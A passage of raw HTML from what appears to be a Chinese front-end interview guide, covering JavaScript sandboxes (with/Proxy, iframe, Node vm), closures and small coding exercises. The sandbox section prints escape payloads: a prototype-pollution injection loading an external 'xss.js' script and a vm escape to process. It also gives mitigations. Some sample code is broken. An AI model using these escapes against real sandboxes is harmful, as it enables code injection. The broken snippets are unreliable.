function\">hasOwnProperty</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  \n                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Illegal operation for key </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>key<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span> \n            <span class=\"token punctuation\">&#125;</span> \n            <span class=\"token keyword\">return</span> target<span class=\"token punctuation\">[</span>key<span class=\"token punctuation\">]</span>  \n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>  \n    <span class=\"token keyword\">return</span> exposeObj  \n\n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token keyword\">function</span> <span class=\"token function\">createSandbox</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">src<span class=\"token punctuation\">,</span>obj</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  \n <span class=\"token keyword\">let</span> proxy <span class=\"token operator\">=</span> <span class=\"token function\">proxyObj</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span>  \n <span class=\"token function\">compileCode</span><span class=\"token punctuation\">(</span>src<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>proxy<span class=\"token punctuation\">,</span>proxy<span class=\"token punctuation\">)</span> <span class=\"token comment\">//绑定this 防止this访问window </span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> testObj <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> \n    <span class=\"token literal-property property\">value</span><span class=\"token operator\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>  \n    <span class=\"token literal-property property\">a</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span> \n        <span class=\"token literal-property property\">b</span><span class=\"token operator\">:</span>  \n    <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span> \n<span class=\"token function\">createSandbox</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"value='haha';console.log(a)\"</span><span class=\"token punctuation\">,</span>testObj<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.<strong>proto</strong>就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token function\">createSandbox</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"> \na.b.__proto__.toString = ()=>&#123;  \n new (()=>&#123;&#125;).constructor(\"var script = document.createElement('script'); \n script.src = 'http://xss.js';\n script.type = 'text/javascript'; \n document.body.appendChild(script);\")() \n&#125;\n</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span>testObj<span class=\"token punctuation\">)</span>  \nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>testObj<span class=\"token punctuation\">.</span>a<span class=\"token punctuation\">.</span>b<span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。</p>\n<p>你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过<strong>proto</strong>查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__proto__<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">toString</span><span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">111</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。</p>\n<ol>\n<li>借助iframe实现沙箱</li>\n</ol>\n<p>前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>iframe sandbox src<span class=\"token operator\">=</span><span class=\"token string\">\"...\"</span><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>iframe<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p> 但是这也会带来一些限制：</p>\n<ol>\n<li><p>script脚本不能执行</p>\n</li>\n<li><p>不能发送ajax请求</p>\n</li>\n<li><p>不能使用本地存储，即localStorage,cookie等</p>\n</li>\n<li><p>不能创建新的弹窗和window</p>\n</li>\n<li><p>不能发送表单</p>\n</li>\n<li><p>不能加载额外插件比如flash等</p>\n<p>不过别方，你可以对这个iframe标签进行一些配置：</p>\n<p><img src=\"https://static.nowcoder.com/images/activity/2021jxy/front/images/p.png\" alt=\"img\"></p>\n</li>\n</ol>\n<p>接下里你只需要结合postMessage API，将你需要执行的代码，和需要暴露的数据传递过去，然后和你的iframe页面通信就行了。</p>\n<p>1）需要注意的是，在子页面中，要注意不要让执行代码访问到contentWindow对象，因为你需要调用contentWindow的postMessageAPI给父页面传递信息，假如恶意代码也获取到了contentWindow对象，相当于就拿到了父页面的控制权了，这个时候可大事不妙。</p>\n<p>2）当使用postMessageAPI的时候，由于sandbox的origin默认为null，需要设置allow-same-origin允许两个页面进行通信，意味着子页面内可以发起请求，这时候需要防范好CSRF，允许了同域请求，不过好在，并没有携带上cookie。</p>\n<p>3）当调用postMessageAPI传递数据给子页面的时候，传输的数据对象本身已经通过结构化克隆算法复制</p>\n<p>简单的说，通过postMessageAPI传递的对象，已经由浏览器处理过了，原型链已经被切断，同时，传过去的对象也是复制好了的，占用的是不同的内存空间，两者互不影响，所以你不需要担心出现第一种沙箱做法中出现的问题。</p>\n<ol>\n<li>nodejs中的沙箱</li>\n</ol>\n<p>nodejs中使用沙箱很简单，只需要利用原生的vm模块，便可以快速创建沙箱，同时指定上下文。</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'vm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">const</span> x <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>  \n<span class=\"token keyword\">const</span> sandbox <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token literal-property property\">x</span><span class=\"token operator\">:</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> \nvm<span class=\"token punctuation\">.</span><span class=\"token function\">createContext</span><span class=\"token punctuation\">(</span>sandbox<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// Contextify the sandbox. </span>\n<span class=\"token keyword\">const</span> code <span class=\"token operator\">=</span> <span class=\"token string\">'x += 40; var y = 17;'</span><span class=\"token punctuation\">;</span>  \nvm<span class=\"token punctuation\">.</span><span class=\"token function\">runInContext</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">,</span> sandbox<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>sandbox<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 42 </span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>sandbox<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 17 </span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1;   y is not defined.</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>vm中提供了runInNewContext、runInThisContext、runInContext三个方法，三者的用法有个别出入，比较常用的是runInNewContext和runInContext，可以传入参数指定好上下文对象。</p>\n<p>但是vm是绝对安全的吗？不一定。</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'vm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \nvm<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this.constructor.constructor('return process')().exit()\"</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>通过上面这段代码，我们可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行，这是我们不希望的，解决方案是绑定好context上下文对象，同时，为了避免通过原型链逃逸（nodejs中的对象并没有像浏览器端一样进行结构化复制，导致原型链依然保留），所以我们需要切断原型链，同时对于传入的暴露对象，只提供基本类型值。</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> ctx <span class=\"token operator\">=</span> Object<span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \nctx<span class=\"token punctuation\">.</span>a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ctx上不能包含引用类型的属性 </span>\nvm<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this.constructor.constructor('return process')().exit()\"</span><span class=\"token punctuation\">,</span> ctx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>让我们来看一下TSW中是怎么使用的：</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'vm'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">const</span> SbFunction <span class=\"token operator\">=</span> vm<span class=\"token punctuation\">.</span><span class=\"token function\">runInNewContext</span><span class=\"token punctuation\">(</span><span class=\"token string\">'(Function)'</span><span class=\"token punctuation\">,</span> Object<span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// 沙堆  </span>\n<span class=\"token operator\">...</span> \n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>opt<span class=\"token punctuation\">.</span>jsonpCallback<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  \n  code <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">var result=null; var </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>opt<span class=\"token punctuation\">.</span>jsonpCallback<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">=function($1)&#123;result=$1&#125;; </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>responseText<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">; return result;</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">;</span>  \n  obj <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">SbFunction</span><span class=\"token punctuation\">(</span>code<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span>   \n<span class=\"token operator\">...</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>通过runInNewContext返回沙箱中的构造函数Function，同时传入切断原型链的空对象防止逃逸，之后再外部使用的时候，只需要调用返回的这个函数，和普通的new Function一样调用即可。</p>\n<h3 id=\"53、闭包的理解\"><a href=\"#53、闭包的理解\" class=\"headerlink\" title=\"53、闭包的理解\"></a>53、闭包的理解</h3><p><strong>参考答案：</strong></p>\n<p>闭包：</p>\n<p> 一个函数和对其周围状态（<strong>lexical environment，词法环境</strong>）的引用捆绑在一起（或者说函数被引用包围）， 这样的组合就是<strong>闭包</strong>（<strong>closure</strong>）。也就是说，闭包让你可以在一个内层函数中访问到其外层函数的作用域。在 JavaScript 中，每当创建一个函数，闭包就会在函数创建的同时被创建出来。</p>\n<p>闭包的特点：</p>\n<p> 让外部访问函数内部变量成为可能；<br>​ 可以避免使用全局变量，防止全局变量污染；<br>​ 可以让局部变量常驻在内存中；<br>​ 会造成内存泄漏（有一块内存空间被长期占用，而不被释放）</p>\n<p>应用场景</p>\n<ol>\n<li>埋点（是网站分析的一种常用的数据采集方法）计数器</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">var</span> num <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token operator\">++</span>num\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">var</span> getNum <span class=\"token operator\">=</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">var</span> getNewNum <span class=\"token operator\">=</span> <span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\ndocument<span class=\"token punctuation\">.</span><span class=\"token function\">querySelectorAll</span><span class=\"token punctuation\">(</span><span class=\"token string\">'button'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onclick</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'点击加入购物车次数： '</span><span class=\"token operator\">+</span><span class=\"token function\">getNum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\ndocument<span class=\"token punctuation\">.</span><span class=\"token function\">querySelectorAll</span><span class=\"token punctuation\">(</span><span class=\"token string\">'button'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onclick</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">'点击付款次数： '</span><span class=\"token operator\">+</span><span class=\"token function\">getNewNum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>    <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>事件+循环</li>\n</ol>\n<p>按照以下方式添加事件，打印出来的i不是按照序号的</p>\n<p>形成原因就是操作的是同一个词法环境,因为onclick后面的函数都是一个闭包，但是操作的是同一个词法环境</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> lis <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelectorAll</span><span class=\"token punctuation\">(</span><span class=\"token string\">'li'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> lis<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n         lis<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onclick</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n             <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n         <span class=\"token punctuation\">&#125;</span>       \n <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>解决办法：</p>\n<p>使用匿名函数之后，就形成一个闭包， 操作的就是不同的词法环境</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> lis <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelectorAll</span><span class=\"token punctuation\">(</span><span class=\"token string\">'li'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> lis<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">j</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                lis<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onclick</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"JS应用篇\"><a href=\"#JS应用篇\" class=\"headerlink\" title=\"JS应用篇\"></a>JS应用篇</h3><h4 id=\"字符串中的单词逆序输出（手写）\"><a href=\"#字符串中的单词逆序输出（手写）\" class=\"headerlink\" title=\"字符串中的单词逆序输出（手写）\"></a>字符串中的单词逆序输出（手写）</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> str <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello My name is kif and i am from XTU\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">reChange1</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> str<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">reChange1</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> str <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello My name is kif and i am from XTU\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">reChange2</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> newSTr <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> str<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    newSTr <span class=\"token operator\">+=</span> str<span class=\"token punctuation\">.</span><span class=\"token function\">charAt</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> newSTr\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">reChange2</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"function-rand-min-max-N-：生成长度是N，且在min、max内不重复的整数随机数组\"><a href=\"#function-rand-min-max-N-：生成长度是N，且在min、max内不重复的整数随机数组\" class=\"headerlink\" title=\"function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组\"></a>function rand(min, max, N)：生成长度是N，且在min、max内不重复的整数随机数组</h4><p><strong>参考答案：</strong></p>\n<p>把考点拆成了4个小项；需要用递归算法实现：<br>a) 生成一个长度为n的空数组arr。<br>b) 生成一个（min－max）之间的随机整数rand。<br>c) 把随机数rand插入到数组arr内，如果数组arr内已存在与rand相同的数字，则重新生成随机数rand并插入到 arr内[需要使用递归实现，不能使用for&#x2F;while等循环]<br>d) 最终输出一个长度为n，且内容不重复的数组arr。</p>\n<h4 id=\"Math-random\"><a href=\"#Math-random\" class=\"headerlink\" title=\"Math.random\"></a>Math.random</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">//产生一个[0，1)之间的随机数。</span>\nMath<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>：\n \n<span class=\"token comment\">//返回指定范围的随机数(m-n之间)的公式:</span>\nMath<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span>m<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>m；\n或者\nMath<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>m<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>m<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">buildArray</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> min<span class=\"token punctuation\">,</span> max</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">var</span> num <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">floor</span><span class=\"token punctuation\">(</span>Math<span class=\"token punctuation\">.</span><span class=\"token function\">random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>max <span class=\"token operator\">-</span> min <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> min<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>arr<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> arr<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>num<span class=\"token 